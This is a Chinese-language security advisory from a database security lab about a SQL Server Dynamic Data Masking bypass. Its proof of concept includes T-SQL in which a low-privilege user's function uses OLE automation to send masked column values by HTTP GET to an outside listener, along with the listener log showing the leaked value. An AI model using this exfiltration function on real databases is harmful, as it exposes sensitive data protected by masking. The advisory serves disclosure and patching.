      近日，**安华金和数据库安全实验室发现Microsoft SQL Server动态数据掩码（DDM）功能存在信息泄漏漏洞**。此问题已上报至微软安全响应中心，**在最新版本的Microsoft SQL Server中对该问题进行了修复。**

  
受影响的产品和版本  

Microsoft SQL Server 2019 (RTM-CU14) (KB5007182) - 15.0.4188.2 (X64) 以及之前的版本

  

  
详细说明  

  

动态数据屏蔽是SQL Server 2016引入的一项新的特性，通过数据屏蔽，你可以对非授权用户限制敏感数据的曝光。但非特权用户可以通过精心设计的函数绕过屏蔽规则的限制。

  

  
概念证明  
  
  
  

1.创建一个带有动态数据掩码的表。

 

CREATE SCHEMA Data;

 

CREATE TABLE Data.Membership(

 

    MemberID        int IDENTITY(1,1) NOT NULL PRIMARY KEY CLUSTERED,

 

    FirstName        varchar(100) MASKED WITH (FUNCTION = 'partial(1, "xxxxx", 1)') NULL );

 

INSERT INTO Data.Membership ( FirstName) VALUES    ( 'Dbsec');

 

2.创建一个新用户并授予对表Data.Membership EXECUTE、SELECT、ALTER 的权限。

 

CREATE USER MaskingTestUser WITHOUT LOGIN;  

 

GRANT EXECUTE,SELECT,ALTER ON SCHEMA::Data TO MaskingTestUser;  

 

GRANT CREATE FUNCTION TO MaskingTestUser;

 

3.切换到MaskingTestUser用户查看该表数据

 

EXECUTE AS USER = 'MaskingTestUser';  

 

SELECT \* FROM Data.Membership;  

  

![](../Images/8c9d0d9107851148056a4ecc78fd07e8.png)

可以看到此时MaskingTestUser用户只能看到屏蔽后的数据

  

4.创建一个精心设计的包含 OLE 自动化存储过程的函数

CREATE  FUNCTION Data.REDACT\_TEST(@msgnum INTEGER,@para1 varchar(100)) returns INTEGER

 

as

 

begin

 

DECLARE @objServHTTP INT

 

DECLARE @rc TINYINT

 

declare @UrlAddress varchar(500)

 

declare @ServiceUrl as varchar(1000)

 

set @UrlAddress = 'http://10.10.8.111:8000/'

 

set @ServiceUrl = @UrlAddress + @para1

 

EXEC @rc = sp\_OACreate 'MSXML2.ServerXMLHTTP', @objServHTTP OUT

 

EXEC @rc = sp\_OAMethod @objServHTTP, 'open', NULL, 'GET',@ServiceUrl

 

EXEC @rc = sp\_OAMethod @objServHTTP, 'send'

 

EXEC @rc = sp\_OADestroy @objServHTTP

 

return @msgnum;

 

end

 

5.用户 MaskingTestUser 将直接从 T-SQL 发送 HTTP 请求到服务 http://10.10.8.111:8000/。所以我执行以下命令来监听 HTTP sockets。

python -m http.server

 

Serving HTTP on :: port 8000 (http://\[::\]:8000/) …

 

6.EXECUTE AS USER = 'MaskingTestUser';  

 

SELECT \* FROM Data.Membership where MemberID=data.REDACT\_TEST(1,FirstName);

 

7.然后 Python HTTP 服务器接收以下数据。

python -m http.server

 

Serving HTTP on :: port 8000 (http://\[::\]:8000/) …

 

::ffff:10.10.8.194 - - \[08/Dec/2021 16:28:19\] code 404, message File not found

 

::ffff:10.10.8.194 - - \[08/Dec/2021 16:28:19\] "GET /Dbsec HTTP/1.1" 404 -

 

最后，获得了 FirstName 列的真实值。

  
  
  
  
  
  
  

  

此问题之前已上报微软安全响应中心，微软方面回复称这并不是一个安全问题。但在微软最新发布的版本Microsoft SQL Server 2019 (RTM-CU16) (KB5011644) - 15.0.4223.1 (X64)   Apr 11 20中，此问题已经得到了修复。动态数据掩码（DDM）功能本身就是为了防止对敏感数据的非授权访问，但是通过以上方式还是绕过了屏蔽规则。**为防止遭到此类漏洞攻击，建议还在使用老版本SqlServer的用户尽快升级到最新版本。**

  

  

关于安华金和数据库安全实验室

  

安华金和早在2010年便已建立数据库安全实验室（DBSec Labs），**是中国第一批成立的、规模化的数据库安全研究机构，也是国内率先针对数据库漏洞进行系统分类与定性分析的专业团队**。2019-2021年，DBSec Labs连续三年蝉联网络安全金帽子“**年度杰出安全实验室**”称号！

  

截至目前，DBSec Labs向IBM、Oracle、Informix、DB2、MongoDB以及达梦、人大金仓、Gbase等**国内外主流数据库厂商提交并获认证的数据库漏洞共计151个**（国际漏洞45个，国内漏洞106个），其中信创数据库漏洞高达85个；累计复现数据库漏洞 102个，包括超危漏洞10个、高危漏洞 27个、中危31漏洞个、低危漏洞11 个、未定级漏洞 23个。DBSec Labs在中国区CVE数据库漏洞挖掘数量上长年大幅领先！
